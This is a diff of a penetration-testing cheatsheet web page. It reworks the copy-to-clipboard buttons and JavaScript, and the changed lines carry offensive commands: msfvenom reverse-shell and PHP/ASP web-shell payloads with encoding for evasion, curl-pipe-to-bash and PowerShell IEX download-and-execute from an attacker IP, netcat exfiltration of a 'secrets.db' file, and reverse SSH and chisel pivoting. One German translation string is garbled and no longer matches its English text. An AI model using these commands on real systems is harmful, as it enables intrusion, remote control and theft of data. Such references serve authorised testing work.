+strings firmware.bin | grep -i password</code>
+            </pre>
         </div>
     </div>
     
@@ -608,17 +826,29 @@ strings firmware.bin | grep -i password</code></pre>
             <p class="command-desc" data-i18n="section17CommandDesc">Techniques to minimize risk via Docker isolation and ensure detailed test outcome logging.</p>
             
             <p class="command-desc"># isolated container (no external network)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash</code>
+            </pre>
 
             <p class="command-desc">spin up target service in container (lab)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>docker run --rm -p 8080:80 vuln-app:latest</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>docker run --rm -p 8080:80 vuln-app:latest</code>
+            </pre>
 
             <p class="command-desc">logging with timestamps & tool version</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt</code>
+            </pre>
 
             <p class="command-desc">save JSON where possible</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nuclei -l hosts.txt -o nuclei.json -oJ nuclei.json
-ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nuclei -l hosts.txt -o nuclei.json -oJ nuclei.json
+ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code>
+            </pre>
         </div>
     </div>
     
@@ -637,19 +867,34 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code></
             <p class="command-desc" data-i18n="section18CommandDesc">Use the '-e' flag for evasion (encoding) and the '-f' flag for different output formats.</p>
 
             <p class="command-desc">Windows Reverse Shell (Encoded 3 times)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > /root/Desktop/payload-enc.exe</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > /root/Desktop/payload-enc.exe</code>
+            </pre>
 
             <p class="command-desc">Linux Python Reverse Shell (Raw Output, useful for injection)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw</code>
+            </pre>
 
             <p class="command-desc">Windows ASP Payload for Web Server Injection</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp > shell.asp</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp > shell.asp</code>
+            </pre>
             
             <p class="command-desc">PHP Web Shell for Upload Vulnerabilities</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php</code>
+            </pre>
 
             <p class="command-desc">Raw Linux x64 Shellcode (C format)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c</code>
+            </pre>
         </div>
     </div>
     
@@ -667,22 +912,40 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code></
             <p class="command-desc" data-i18n="section19CommandDesc">Essential techniques using native binaries (curl, wget) and common languages (Python, Netcat).</p>
 
             <p class="command-desc"># Attacker: Python HTTP Server (Serving files)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>python3 -m http.server 8000</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>python3 -m http.server 8000</code>
+            </pre>
 
             <p class="command-desc">Target (Linux): Download file via wget (Attacker IP: 10.0.0.5)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>wget http://10.0.0.5:8000/tool.sh</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>wget http://10.0.0.5:8000/tool.sh</code>
+            </pre>
 
             <p class="command-desc">Target (Linux): Download file via curl (In-Memory execution, safer)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl http://10.0.0.5:8000/script.sh | bash</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>curl http://10.0.0.5:8000/script.sh | bash</code>
+            </pre>
 
             <p class="command-desc">Attacker: Netcat Listener (Receive file: 'data.txt' from target)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc -l -p 8888 > received_data.txt</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nc -l -p 8888 > received_data.txt</code>
+            </pre>
 
             <p class="command-desc">Target: Netcat Transfer (Send file: 'secrets.db' to Attacker IP: 10.0.0.5)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc 10.0.0.5 8888 < secrets.db</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>nc 10.0.0.5 8888 < secrets.db</code>
+            </pre>
 
             <p class="command-desc">Target (Windows): Download file via PowerShell (IEX)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/shell.ps1')</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/shell.ps1')</code>
+            </pre>
         </div>
     </div>
     
@@ -700,25 +963,43 @@ ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json</code></
             <p class="command-desc" data-i18n="section20CommandDesc">Utilizing SSH, Meterpreter, and native tools to create port forwards and SOCKS proxies.</p>
             
             <p class="command-desc"># Local SSH Port Forward (Tunnel local port to remote target)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ssh -L 8080:192.168.1.10:80 user@jumpbox.corp</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>ssh -L 8080:192.168.1.10:80 user@jumpbox.corp</code>
+            </pre>
 
             <p class="command-desc">Reverse SSH Tunnel (Target connects back to attacker to create a forward)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ssh -R 9000:127.0.0.1:80 user@10.0.0.5</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>ssh -R 9000:127.0.0.1:80 user@10.0.0.5</code>
+            </pre>
 
             <p class="command-desc">Metasploit Portfwd (Meterpreter session: tunnel target-side port to local)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>portfwd add -l 3389 -r 192.168.1.15 -p 3389</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>portfwd add -l 3389 -r 192.168.1.15 -p 3389</code>
+            </pre>
 
             <p class="command-desc">SOCKS Proxy via Metasploit (Enable proxy via a Meterpreter session)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>use auxiliary/server/socks_proxy
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>use auxiliary/server/socks_proxy
 set SRVHOST 0.0.0.0
 set SRVPORT 1080
-run</code></pre>
+run</code>
+            </pre>
 
             <p class="command-desc">Chisel (Attacker: SOCKS server)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>./chisel server -p 8000 --socks5</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>./chisel server -p 8000 --socks5</code>
+            </pre>
             
             <p class="command-desc">Chisel (Target: Connect to server and create tunnel)</p>
-            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>./chisel client 10.0.0.5:8000 R:1080:socks</code></pre>
+            <pre class="command-block">
+                <span class="copy-feedback" data-i18n="copyButtonText">Copy</span>
+                <code>./chisel client 10.0.0.5:8000 R:1080:socks</code>
+            </pre>
         </div>
     </div>
 
@@ -772,7 +1053,7 @@ run</code></pre>
         // SECTION 6: Web Discovery & Fuzzing
         "section6Title": { "en": "6) Web Discovery & Fuzzing", "ru": "6) Веб-обнаружение и фаззинг", "he": "6) גילוי ופאזינג של ווב", "fr": "6) Découverte Web et Fuzzing", "de": "6) Web-Entdeckung & Fuzzing" },
         "section6Desc": { "en": "Bruteforcing directories, files, and virtual hosts.", "ru": "Перебор каталогов, файлов и виртуальных хостов методом перебора.", "he": "כוח גס (Bruteforcing) על ספריות, קבצים ומארחים וירטואליים.", "fr": "Bruteforcing de répertoires, fichiers et hôtes virtuels.", "de": "Bruteforcing von Verzeichnissen, Dateien und virtuellen Hosts." },
-        "section6CommandDesc": { "en": "Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).", "ru": "Использует ffuf и gobuster для обнаружения контента, фильтруя общие коды состояния успеха (200, 301, 302).", "he": "משתמש ב-ffuf וב-gobuster לגילוי תוכן, סינון לפי קודי סטטוס הצלחה נפוצים (200, 301, 302).", "fr": "Utilise ffuf et gobuster pour la découverte de contenu, en filtrant les codes d'état de succès courants (200, 301, 302).", "de": "Verwendet ffuf und gobuster zur Inhaltserkennung, Filterung nach gängigen Erfolgsstatuscodes (200, 301, 302)." },
+        "section6CommandDesc": { "en": "Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).", "ru": "Использует ffuf и gobuster для обнаружения контента, фильтруя общие коды состояния успеха (200, 301, 302).", "he": "משתמש ב-ffuf וב-gobuster לגילוי תוכן, סינון לפי קודי סטטוס הצלחה נפוצים (200, 301, 302).", "fr": "Utilise ffuf et gobuster pour la découverte de contenu, en filtrant les codes d'état de succès courants (200, 301, 302).", "de": "Verwendet ffuf und gobuster für eine umfassende Zielbereich, der passive und aktive Quellen kombiniert." },
 
         // SECTION 7: Web Application Testing
         "section7Title": { "en": "7) Web Application Testing", "ru": "7) Тестирование веб-приложений", "he": "7) בדיקת יישומי ווב", "fr": "7) Test d'applications Web", "de": "7) Webanwendungstests" },
@@ -909,15 +1190,14 @@ run</code></pre>
         // 5. Save the preference
         setCookie('cheatsheet_lang', lang, 30);
         
-        // 6. Update copy button text
-        document.querySelectorAll('.copy-btn').forEach(btn => {
-            // Only update if it's not currently showing a "Copied!" message
-            if (!btn.hasAttribute('data-copied')) {
-                btn.textContent = translations['copyButtonText'][lang] || 'Copy';
+        // 6. Update the copy feedback span default text
+        document.querySelectorAll('.copy-feedback').forEach(span => {
+            if (!span.classList.contains('visible')) {
+                span.textContent = translations['copyButtonText'][lang] || 'Copy';
             }
         });
 
-        // 7. Update share links URL
+        // 7. Update share links URL (Simplified, relies on placeholder #)
         const currentUrl = encodeURIComponent(window.location.href);
         const defaultText = encodeURIComponent("Penetration Testing & Vulnerability Research Cheatsheet by @trippingalien - A robust collection of commands for recon, exploits, and reversing.");
         
@@ -942,28 +1222,30 @@ run</code></pre>
 
     // --- COPY & SECTION LOGIC ---
 
-    function copyCommand(button) {
-        const pre = button.closest('pre');
-        const code = pre.querySelector('code').innerText;
+    function copyCommand(preElement) {
+        const code = preElement.querySelector('code').innerText;
+        const feedbackSpan = preElement.querySelector('.copy-feedback');
 
         // Remove the initial prompt like '# Set target TARGET=example.com' or comments
         const cleanedCode = code.split('\n').filter(line => !line.trim().startsWith('#') && line.trim() !== '').join('\n');
 
         navigator.clipboard.writeText(cleanedCode).then(() => {
             const lang = getCookie('cheatsheet_lang') || 'en';
+            // Determine the "Copied!" text based on the current language
             const copiedText = translations['copyButtonText'][lang] === 'Copy' ? 'Copied!' : 
                                translations['copyButtonText'][lang] === 'Копировать' ? 'Скопировано!' : 
                                translations['copyButtonText'][lang] === 'העתק' ? 'הועתק!' : 
                                translations['copyButtonText'][lang] === 'Copier' ? 'Copié!' : 
                                translations['copyButtonText'][lang] === 'Kopieren' ? 'Kopiert!' : 'Copied!';
             
-            button.textContent = copiedText;
-            button.setAttribute('data-copied', 'true');
+            // Show feedback
+            feedbackSpan.textContent = copiedText;
+            feedbackSpan.classList.add('visible');
             
             setTimeout(() => {
-                // Restore the original text by re-translating and removing the flag
-                button.removeAttribute('data-copied');
-                translate(lang); 
+                // Hide the message and restore the original text
+                feedbackSpan.classList.remove('visible');
+                feedbackSpan.textContent = translations['copyButtonText'][lang] || 'Copy'; 
             }, 1500);
         }).catch(err => {
             console.error('Failed to copy: ', err);
@@ -1021,9 +1303,8 @@ run</code></pre>
         // 1. Set up section expand/collapse functionality
         setupSectionToggles();
         
-        // 2. Get preferred language (default to English) and translate all content
+        // 2. Get preferred language (default to English)
         const storedLang = getCookie('cheatsheet_lang') || 'en';
-        translate(storedLang);
 
         // 3. Set up language dropdown event listener
         const langSelect = document.getElementById('languageSelect');
@@ -1033,15 +1314,21 @@ run</code></pre>
             });
         }
 
-        // 4. Set up button handlers
+        // 4. Set up master toggle handler
         document.getElementById('toggleAllButton').addEventListener('click', toggleAll);
-        document.querySelectorAll('.copy-btn').forEach(button => {
-            button.addEventListener('click', function() {
-                copyCommand(this);
+        
+        // 5. Set up the "Click-to-Copy" handlers on all <pre> blocks
+        document.querySelectorAll('pre').forEach(pre => {
+            pre.addEventListener('click', function(event) {
+                // Ensure we only trigger on the PRE or CODE content, not other elements we might add (like the feedback span)
+                if (event.target.tagName === 'CODE' || event.target.tagName === 'PRE') {
+                    copyCommand(this);
+                }
             });
         });
-
-        // Search bar functionality removed
+        
+        // 6. Final translation call to apply initial text and language
+        translate(storedLang);
     };
 </script>
 
